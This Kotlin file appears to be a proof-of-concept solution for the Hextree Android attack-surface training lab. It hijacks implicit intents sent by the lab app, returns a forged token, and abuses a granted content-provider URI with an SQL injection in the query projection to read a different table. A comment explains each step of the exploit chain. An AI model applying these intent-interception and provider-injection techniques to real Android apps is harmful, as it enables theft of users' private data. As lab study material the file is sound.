package com.vishal2376.hextreepoc

import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import com.vishal2376.hextreepoc.Utils.dumpCursor

class ImplicitIntentActivity : AppCompatActivity() {
	override fun onCreate(savedInstanceState: Bundle?) {
		super.onCreate(savedInstanceState)

		Utils.showDialog(this, intent)

		// Intercept Flag12's implicit intent and return expected token
		when (intent.action) {
			"io.hextree.attacksurface.ATTACK_ME" -> {

				val resultIntent = Intent().apply {
					putExtra("token", 1094795585)
				}

				setResult(RESULT_OK, resultIntent)
				finish()
			}

			/**
			 * FLAG 33.2 - Implicit Provider Access
			 * Technique: Implicit intent interception + URI grant + table-swap injection
			 *
			 * Flow:
			 * 1. Open Flag33Activity2 from WITHIN the hextree app's own UI (exported=false,
			 *    same-UID launch required - cannot be triggered from our POC app directly)
			 * 2. With no "secret" extra, it fires implicit intent: action="io.hextree.FLAG33",
			 *    data=content://io.hextree.flag33_2/flags, flags=1 (GRANT_READ_URI_PERMISSION)
			 * 3. Android resolves it to us (matched on action+category+data in manifest)
			 *    and grants us temporary read access to that exact URI
			 * 4. Query it with table-swap injection to read from Note table instead of Flag table
			 * 5. containsFlag33() finds match -> success() -> Activity2 relaunches with real secret
			 *
			 * Key insight: same grantUriPermissions bypass as 33.1, but the trigger is an implicit
			 * intent instead of a result intent - we register for the exact action+data combo so
			 * the OS routes directly to us, no chooser dialog since we're the only match.
			 */
			"io.hextree.FLAG33" -> {
				dumpCursor(
					context = this,
					uri = intent?.data.toString(),
					projection = arrayOf("* FROM Note; -- -"),
					title = "Flag 33_2"
				)
				finish()
			}
		}
	}
}